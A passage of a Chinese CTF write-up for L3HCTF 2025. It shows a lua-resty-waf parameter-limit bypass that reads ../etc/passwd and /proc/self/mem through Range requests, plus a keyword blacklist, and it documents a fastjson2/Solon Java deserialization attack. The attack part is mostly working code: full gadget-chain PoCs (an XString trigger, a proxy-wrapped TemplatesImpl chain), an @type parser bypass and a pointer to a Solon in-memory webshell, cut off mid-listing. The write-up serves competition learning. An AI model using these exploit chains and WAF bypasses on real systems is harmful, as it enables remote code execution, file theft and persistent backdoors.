string.find(v, b) then</span><br><span class="line">                ngx.exit(<span class="number">403</span>)</span><br><span class="line">                    end</span><br><span class="line">            end</span><br><span class="line">    end</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/p0pr0ck5/lua-resty-waf/issues/280">https://github.com/p0pr0ck5/lua-resty-waf/issues/280</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download?&amp;a0=0&amp;a1=1&amp;a2=2&amp;a3=3&amp;a4=4&amp;a5=5&amp;a6=6&amp;a7=7&amp;a8=8&amp;a9=9&amp;a10=10&amp;a11=11&amp;a12=12&amp;a13=13&amp;a14=14&amp;a15=15&amp;a16=16&amp;a17=17&amp;a18=18&amp;a19=19&amp;a20=20&amp;a21=21&amp;a22=22&amp;a23=23&amp;a24=24&amp;a25=25&amp;a26=26&amp;a27=27&amp;a28=28&amp;a29=29&amp;a30=30&amp;a31=31&amp;a32=32&amp;a33=33&amp;a34=34&amp;a35=35&amp;a36=36&amp;a37=37&amp;a38=38&amp;a39=39&amp;a40=40&amp;a41=41&amp;a42=42&amp;a43=43&amp;a44=44&amp;a45=45&amp;a46=46&amp;a47=47&amp;a48=48&amp;a49=49&amp;a50=50&amp;a51=51&amp;a52=52&amp;a53=53&amp;a54=54&amp;a55=55&amp;a56=56&amp;a57=57&amp;a58=58&amp;a59=59&amp;a60=60&amp;a61=61&amp;a62=62&amp;a63=63&amp;a64=64&amp;a65=65&amp;a66=66&amp;a67=67&amp;a68=68&amp;a69=69&amp;a70=70&amp;a71=71&amp;a72=72&amp;a73=73&amp;a74=74&amp;a75=75&amp;a76=76&amp;a77=77&amp;a78=78&amp;a79=79&amp;a80=80&amp;a81=81&amp;a82=82&amp;a83=83&amp;a84=84&amp;a85=85&amp;a86=86&amp;a87=87&amp;a88=88&amp;a89=89&amp;a90=90&amp;a91=91&amp;a92=92&amp;a93=93&amp;a94=94&amp;a95=95&amp;a96=96&amp;a97=97&amp;a98=98&amp;a=information_schemas&amp;filename=../etc/passwd</span><br></pre></td></tr></table></figure>

<p>对于此处的过滤</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">proxy_pass http:<span class="comment">//127.0.0.1/static$arg_filename;</span></span><br><span class="line">body_filter_by_lua_block &#123;</span><br><span class="line">    local blacklist = &#123;<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;l3hsec&quot;</span>, <span class="string">&quot;l3hctf&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;secret&quot;</span>, <span class="string">&quot;confidential&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> _, b in ipairs(blacklist) do</span><br><span class="line">        <span class="keyword">if</span> <span class="type">string</span>.find(ngx.arg[<span class="number">1</span>], b) then</span><br><span class="line">            ngx.arg[<span class="number">1</span>] = <span class="type">string</span>.rep(<span class="string">&quot;*&quot;</span>, <span class="type">string</span>.<span class="built_in">len</span>(ngx.arg[<span class="number">1</span>]))</span><br><span class="line">            end</span><br><span class="line">        end</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Range 头是 HTTP 协议中用于请求部分内容的请求头，格式为：</p>
<blockquote>
<p>Range: bytes&#x3D;[start]-[end]</p>
<p>允许客户端指定需要获取的资源字节范围，实现断点续传和分块下载功能。</p>
</blockquote>
<p><img src="../images/2025-L3HCTF/64b86e56-6d44-4532-8aa1-f2f91eeae5c5.png" alt="img"></p>
<p>首先利用此方法遍历文件描述符在 &#x2F;proc&#x2F;1&#x2F;fd&#x2F;6 找到 password 为<code>passwordismemeispasswordsoneverwannagiveyouup</code></p>
<p>然后可以先通过<code>/proc/self/maps</code>获得当前进程虚拟地址映射</p>
<p><img src="../images/2025-L3HCTF/c12f8782-5fe4-424c-b894-162e22a108cb.png" alt="img"></p>
<p>在本地环境 nginx.conf 的初始化代码后面加上一段，获取 flag 变量的地址</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">init_by_lua_block &#123;</span><br><span class="line">        # 在最后加上一段</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">tostring</span>(flag))</span><br><span class="line">        <span class="keyword">local</span> ffi = <span class="built_in">require</span>(<span class="string">&quot;ffi&quot;</span>)</span><br><span class="line">        <span class="keyword">local</span> ptr = ffi.cast(<span class="string">&quot;const char*&quot;</span>, flag)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Address: &quot;</span>, <span class="built_in">tostring</span>(ptr))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找到 flag 存储在 &#x2F;dev&#x2F;zero 的下一段内存中</p>
<p>读取 &#x2F;proc&#x2F;self&#x2F;mem 中对应的内存，搜索 ‘L3H’ 即可获得 flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /read_anywhere HTTP/1.1</span><br><span class="line">Host: Your_host</span><br><span class="line">X-Gateway-Password: test_password</span><br><span class="line">X-Gateway-Filename: /proc/self/mem</span><br><span class="line">X-Gateway-Start: 0x7e07636f3000</span><br><span class="line">X-Gateway-Length: 0x100000</span><br></pre></td></tr></table></figure>

<h2><span id="tellmewhy">Tellmewhy</span><a href="#tellmewhy" class="header-anchor"></a></h2><p>一道java题，solon框架，存在fastjson2依赖</p>
<p><img src="../images/2025-L3HCTF/58ce9bd7-c3a4-402c-9cf4-f51a6c49a316.png" alt="img"></p>
<p>&#x2F;baby&#x2F;way 路由存在反序列化点</p>
<p><img src="../images/2025-L3HCTF/f51300e2-7447-483a-a66e-0b2dbdeb182a.png" alt="img"></p>
<p>自定义objectStream中定义了反序列化黑名单</p>
<ul>
<li>javax.management.BadAttributeValueExpException</li>
<li>javax.swing.event.EventListenerList</li>
<li>javax.swing.UIDefaults$TextAndMnemonicHashMap</li>
</ul>
<p>目的应该是想过滤hashmap -&gt; fastjson2.JSONArray中的链子，不管是通过经验还是跑一下tabby都能发现还有XString这个可用的链子</p>
<p><img src="../images/2025-L3HCTF/80313d59-c466-4877-9542-8f492b4c9f7b.png" alt="img"></p>
<p>基于这个构造出基础payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TestObj</span> <span class="variable">testObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestObj</span>();</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject1.put(<span class="string">&quot;g&quot;</span>, testObj);</span><br><span class="line">        </span><br><span class="line">        <span class="type">XString</span> <span class="variable">xs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;yy&quot;</span>,jsonObject1);</span><br><span class="line">        hashMap.put(<span class="string">&quot;zZ&quot;</span>, xs);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;yy&quot;</span>,xs);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;zZ&quot;</span>,jsonObject1);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> makeMap(hashMap, hashMap2);</span><br><span class="line">        serialize(obj);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">makeMap</span><span class="params">(Object v1, Object v2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fastjson2 与 fastjson1 机制上不太一样，通过fastjson2 构造反序列化链触发templates会进入黑名单，常见的打法是需要通过代理类进行处理，这部分详细内容可通过下述链接学习：</p>
<ul>
<li><a href="https://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q">https://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q</a></li>
<li><a href="https://github.com/Ape1ron/FastjsonInDeserializationDemo1#">https://github.com/Ape1ron/FastjsonInDeserializationDemo1#</a></li>
</ul>
<p>出题人在赛题中也贴心的直接给出了可以使用的代理类org.example.demo.Utils.MyProxy</p>
<p><img src="../images/2025-L3HCTF/5f8b27e1-24a3-4b12-a436-64107531231c.png" alt="img"></p>
<p>在有这个类的基础上就可以编写出完整的poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> common.Reflections;</span><br><span class="line"><span class="keyword">import</span> common.Util;</span><br><span class="line"><span class="keyword">import</span> gadgets.*;</span><br><span class="line"><span class="keyword">import</span> org.example.demo.Utils.MyObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson4_ObjectFactoryDelegatingInvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.setProperty(&quot;properXalan&quot;, &quot;true&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node1</span> <span class="operator">=</span> TemplatesImplNode.makeGadget(cmd);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;object&quot;</span>, node1);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node2</span> <span class="operator">=</span> JSONObjectNode.makeGadget(<span class="number">2</span>, map);</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy1</span> <span class="operator">=</span> (Proxy) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ObjectFactory.class, MyObject.class&#125;, (InvocationHandler) node2);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node3</span> <span class="operator">=</span> makeGadget(proxy1);</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy2</span> <span class="operator">=</span> (Proxy) Proxy.newProxyInstance(Proxy.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, (InvocationHandler) node3);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node4</span> <span class="operator">=</span> JsonArrayNode.makeGadget(<span class="number">2</span>, proxy2);</span><br><span class="line"><span class="comment">//       Object node5 = BadAttrValExeNode.makeGadget(node4);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">gadgetChain</span> <span class="operator">=</span> makeXStringToStringTrigger(node4);</span><br><span class="line"></span><br><span class="line">        Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;node1, gadgetChain&#125;;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node6</span> <span class="operator">=</span> HashMapNode.makeGadget(array);</span><br><span class="line">        <span class="keyword">return</span> node6;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">makeXStringToStringTrigger</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">XString</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> makeMap(o, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">makeMap</span><span class="params">(Object v1, Object v2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>, v1);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>, v2);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>, v2);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>, v1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, map1, map1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, map2, map2, <span class="literal">null</span>));</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fastjson4_ObjectFactoryDelegatingInvocationHandler</span>().getObject(Util.getDefaultTestCmd());</span><br><span class="line">        <span class="type">byte</span>[] serialize = Util.serialize(object);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(serialize);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line"><span class="comment">//        Util.runGadgets(object);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeGadget</span><span class="params">(Object gadget)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> Reflections.newInstance(<span class="string">&quot;org.example.demo.Utils.MyProxy&quot;</span>,</span><br><span class="line">                MyObject.class, gadget);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在进入到正式的反序列化逻辑之前还有一个问题，改路由对传递进的json数量进行了比对，solon框架解析到的map和fastjson2解析到的length需要不一致</p>
<p><img src="../images/2025-L3HCTF/95170242-6afe-45d8-b014-f86259b1d996.png" alt="img"></p>
<p>这一点就涉及到了解析特性相关内容，fastjson2和fastjson1一致，仍旧支持@type键，在正常的solon解析是无法被解析到，从而绕过了这一点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;: &quot;java.util.HashMap&quot;,&quot;why&quot;:&quot;base64 payload&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>最后成功触发反序列化，但远程环境不出网，还需要去找一个solon内存马</p>
<p><a href="https://github.com/wuwumonster/note/blob/3463f12984aa347292d508e4fb1d4d9a7f2b0bc5/JavaSec/JavaSec/%E5%86%85%E5%AD%98%E9%A9%AC/Solon%20%E5%86%85%E5%AD%98%E9%A9%AC.md?plain=1#L84">https://github.com/wuwumonster/note/blob/3463f12984aa347292d508e4fb1d4d9a7f2b0bc5/JavaSec/JavaSec/%E5%86%85%E5%AD%98%E9%A9%AC/Solon%20%E5%86%85%E5%AD%98%E9%A9%AC.md?plain=1#L84</a></p>
<p>随便找了一个solon filter内存马即可</p>
<p><img src="../images/2025-L3HCTF/1e48b496-9f7e-4a88-922c-755b8c8d24d3.png" alt="img"></p>
<p>最后将内存马放入到templates中即可</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> gadgets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> 